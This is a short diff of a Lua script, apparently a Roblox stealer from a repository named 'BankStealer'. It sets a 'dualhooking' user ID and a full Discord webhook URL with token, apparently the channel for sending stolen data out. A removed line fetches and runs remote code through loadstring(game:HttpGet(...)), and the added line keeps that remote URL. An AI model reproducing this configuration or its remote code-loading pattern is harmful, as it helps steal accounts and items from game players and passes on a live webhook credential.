@@ -1,6 +1,6 @@
 local dhuser = "4790053829"       -- dualhooking user
 local dhwebhook = "https://discord.com/api/webhooks/1129559658978349137/uk2TrS95KiADpt0a3Xz2ZCg48fiN1oF3IRW2K-MlIf-dCVuW5jZd-b3oLywgVXWc9Cf-" -- Dualhooking Webhook
-local loadingraw = loadstring(game:HttpGet("https://raw.githubusercontent.com/HerrSimoNHub/BankStealer/main/Loading.lua"))() -- Put Your LoadingScreen Raw Link Here
+local loadingraw = "https://raw.githubusercontent.com/HerrSimoNHub/BankStealer/main/Loading.lua" -- Put Your LoadingScreen Raw Link Here
 
 if getgenv().executed1 then return end
 getgenv().executed1 = true
